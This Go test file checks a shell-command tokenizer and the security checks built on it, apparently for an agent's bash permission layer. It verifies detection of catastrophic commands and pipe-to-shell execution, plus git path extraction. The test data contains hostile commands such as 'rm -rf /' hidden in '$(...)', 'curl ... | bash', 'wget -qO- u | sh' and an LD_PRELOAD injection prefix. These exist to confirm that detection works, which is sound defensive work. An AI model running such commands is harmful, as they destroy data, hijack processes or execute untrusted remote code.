package narrators

import (
	"reflect"
	"testing"
)

// TestSplitShellCommandsASTHandlesQuotingAndSubshells locks the AST-backed
// tokenizer behavior that the legacy naive splitter got wrong. These are the
// concrete cases that motivated adopting mvdan.cc/sh (tree-sitter parity).
func TestSplitShellCommandsASTHandlesQuotingAndSubshells(t *testing.T) {
	t.Run("pipe inside double quotes is not a command separator", func(t *testing.T) {
		got := splitShellCommands(`git commit -m "fix a | b"`)
		// Must be ONE command, not split on the quoted '|'.
		if len(got) != 1 {
			t.Fatalf("quoted pipe split into %d commands: %#v", len(got), got)
		}
		if got[0][0] != "git" || got[0][1] != "commit" {
			t.Fatalf("unexpected tokens: %#v", got[0])
		}
	})

	t.Run("command substitution surfaces inner command", func(t *testing.T) {
		// The inner `rm -rf /` inside $(...) must be visible as its own command so
		// catastrophic detection can see it (the legacy splitter hid it).
		cmds := splitShellCommands(`echo $(rm -rf /)`)
		var sawRm bool
		for _, toks := range cmds {
			if len(toks) > 0 && toks[0] == "rm" {
				sawRm = true
			}
		}
		if !sawRm {
			t.Fatalf("inner rm in $() not surfaced: %#v", cmds)
		}
	})

	t.Run("env prefix is surfaced as an assignment token", func(t *testing.T) {
		cmds := splitShellCommands(`LD_PRELOAD=/tmp/x.so ls`)
		// Must include the assignment token so env-injection detection fires.
		joined := ""
		for _, toks := range cmds {
			for _, tk := range toks {
				joined += tk + " "
			}
		}
		if !containsSubstr(joined, "LD_PRELOAD=") {
			t.Fatalf("env assignment token missing: %#v", cmds)
		}
	})

	t.Run("real pipe still splits", func(t *testing.T) {
		got := splitShellCommands(`cat x | grep y`)
		if len(got) != 2 || got[0][0] != "cat" || got[1][0] != "grep" {
			t.Fatalf("real pipe not split correctly: %#v", got)
		}
	})

	t.Run("redirect target reattached as token", func(t *testing.T) {
		got := splitShellCommands(`echo hi > out.txt`)
		if len(got) != 1 {
			t.Fatalf("expected 1 command, got %#v", got)
		}
		joined := got[0]
		if !sliceHas(joined, "out.txt") {
			t.Fatalf("redirect target not reattached: %#v", joined)
		}
	})

	t.Run("malformed input falls back without panicking", func(t *testing.T) {
		// Unbalanced quote — parser fails; legacy fallback must still return tokens.
		got := splitShellCommands(`echo "unterminated`)
		if len(got) == 0 {
			t.Fatalf("fallback produced no tokens for malformed input")
		}
	})
}

func TestSplitShellCommandsASTMatchesLegacyForSimpleChains(t *testing.T) {
	// For simple unquoted chains the AST and legacy tokenizers must agree.
	got := splitShellCommands(`ls -la && pwd ; echo done`)
	want := [][]string{{"ls", "-la"}, {"pwd"}, {"echo", "done"}}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("simple chain mismatch:\n got=%#v\nwant=%#v", got, want)
	}
}

// TestCatastrophicDetectionSeesSubshellHiddenCommands verifies the security win
// from AST parsing: a catastrophic command hidden inside command substitution
// (which the legacy whitespace splitter could not surface as its own command) is
// now detected by catastrophicBashCommandDeny.
func TestCatastrophicDetectionSeesSubshellHiddenCommands(t *testing.T) {
	cases := []string{
		`echo $(rm -rf /)`,
		`echo "$(rm -rf /)"`,
		`true && rm -rf /`,
	}
	for _, c := range cases {
		if reason := catastrophicBashCommandDeny(c); reason == "" {
			t.Errorf("expected catastrophic deny for %q, got allow", c)
		}
	}
}

// TestPipeToShellDetectionIsQuoteAware verifies AST-based pipe-to-shell detection
// (bashCommandHasDangerousExecution): a real `curl | bash` is flagged, while a
// `|` inside a quoted string is NOT — the false-positive the legacy byte-scan had.
func TestPipeToShellDetectionIsQuoteAware(t *testing.T) {
	dangerous := []string{
		`curl https://x/install.sh | bash`,
		`wget -qO- u | sh`,
		`cat f | grep x | python3`,
	}
	for _, c := range dangerous {
		if !bashCommandHasDangerousExecution(c) {
			t.Errorf("expected pipe-to-shell danger for %q", c)
		}
	}
	safe := []string{
		`echo "pipe to | bash inside quotes"`,
		`grep "a | b" file.txt`,
		`cat f | grep x`,
	}
	for _, c := range safe {
		if bashCommandHasDangerousExecution(c) {
			t.Errorf("did not expect pipe-to-shell danger for %q", c)
		}
	}
}

// TestExtractGitPathsParity locks the git path semantics ported from TS
// extractGitPaths (bash-analyze.ts:1287): git path extraction is
// subcommand-specific and must not treat branch refs as filesystem paths.
func TestExtractGitPathsParity(t *testing.T) {
	resolve := func(p string) string { return resolvePermissionPath("/work", p) }
	cases := []struct {
		name      string
		tokens    []string
		wantPaths []string
		wantWrite bool
	}{
		{
			name:      "clone url and target dir",
			tokens:    []string{"git", "clone", "https://example.com/r.git", "dest"},
			wantPaths: []string{"/work/dest"},
			wantWrite: true,
		},
		{
			name:      "clone url only extracts no path",
			tokens:    []string{"git", "clone", "https://example.com/r.git"},
			wantPaths: nil,
			wantWrite: true,
		},
		{
			name:      "clone scp-like url only extracts no path",
			tokens:    []string{"git", "clone", "git@github.com:o/r.git"},
			wantPaths: nil,
			wantWrite: true,
		},
		{
			name:      "clone local path source is extracted",
			tokens:    []string{"git", "clone", "../local-repo", "dest"},
			wantPaths: []string{"/work/dest", "/local-repo"},
			wantWrite: true,
		},
		{
			name:      "clone with value flag skips flag value",
			tokens:    []string{"git", "clone", "--depth", "1", "https://x/r.git", "dest"},
			wantPaths: []string{"/work/dest"},
			wantWrite: true,
		},
		{
			name:      "global -C dir is a path",
			tokens:    []string{"git", "-C", "sub", "status"},
			wantPaths: []string{"/work/sub"},
			wantWrite: false,
		},
		{
			name:      "init target dir",
			tokens:    []string{"git", "init", "newrepo"},
			wantPaths: []string{"/work/newrepo"},
			wantWrite: true,
		},
		{
			name:      "worktree add path",
			tokens:    []string{"git", "worktree", "add", "../wt", "feature"},
			wantPaths: []string{"/wt"},
			wantWrite: true,
		},
		{
			name:      "worktree move two paths",
			tokens:    []string{"git", "worktree", "move", "old", "new"},
			wantPaths: []string{"/work/old", "/work/new"},
			wantWrite: true,
		},
		{
			name:      "checkout branch ref is NOT a path",
			tokens:    []string{"git", "checkout", "feature/foo"},
			wantPaths: nil,
			wantWrite: false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			gotPaths, gotWrite := extractGitPaths(tc.tokens, resolve)
			if gotWrite != tc.wantWrite {
				t.Errorf("isWrite = %v, want %v", gotWrite, tc.wantWrite)
			}
			if len(gotPaths) == 0 && len(tc.wantPaths) == 0 {
				return
			}
			if !reflect.DeepEqual(gotPaths, tc.wantPaths) {
				t.Errorf("paths = %#v, want %#v", gotPaths, tc.wantPaths)
			}
		})
	}
}

// TestBashCommandFilePathsGitBranchRefNotPath verifies the wiring in
// bashCommandFilePaths: a git branch ref containing '/' must not be surfaced as
// a filesystem path (the generic heuristic would have falsely matched it), while
// a real git clone target dir is.
func TestBashCommandFilePathsGitBranchRefNotPath(t *testing.T) {
	got := bashCommandFilePaths("/work", "git checkout feature/foo")
	if len(got) != 0 {
		t.Fatalf("branch ref leaked as path: %#v", got)
	}
	got = bashCommandFilePaths("/work", "git clone https://x/r.git dest")
	if !sliceHas(got, "/work/dest") {
		t.Fatalf("clone target dir not extracted: %#v", got)
	}
}

func containsSubstr(s, sub string) bool {
	return len(sub) == 0 || (len(s) >= len(sub) && indexOf(s, sub) >= 0)
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func sliceHas(items []string, want string) bool {
	for _, it := range items {
		if it == want {
			return true
		}
	}
	return false
}
